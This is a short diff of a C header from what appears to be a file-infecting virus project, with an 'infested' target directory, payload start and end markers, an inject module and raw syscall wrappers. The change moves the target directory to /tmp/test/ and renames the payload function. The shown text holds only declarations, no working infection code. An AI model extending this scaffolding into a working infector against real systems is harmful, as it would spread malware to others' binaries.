@@ -34,19 +34,9 @@
 # define SEEK_CUR 1
 # define SEEK_END 2
 
-/*
-# include <stdio.h>
-# include <unistd.h>
-# include <sys/types.h>
-# include <sys/stat.h>
-# include <fcntl.h>
-*/
-
-# define INFESTED_DIR "/tmp/"
-# define STRINGS_SECTION ".ft_data"
+# define INFESTED_DIR "/tmp/test/"
 
 # define FORCE_INLINE __attribute__((always_inline)) inline
-//# define STORE_VALUE __attribute__((section(STRINGS_SECTION)))
 
 # define WRITE(fd, buffer, len) syscall3(SYS_WRITE, (u64)fd, (u64)buffer, (u64)len)
 # define READ(fd, buffer, len) syscall3(SYS_READ, (u64)fd, (u64)buffer, (u64)len)
@@ -93,7 +83,7 @@ u64 syscall6(int syscall, u64 arg1, u64 arg2, u64 arg3, u64 arg4, u64 arg5, u64 
 t_binary get_infos(int fd);
 
 /* main.c */
-void payload(void);
+void payload_start(void);
 void payload_end(void);
 
 /* inject.c */
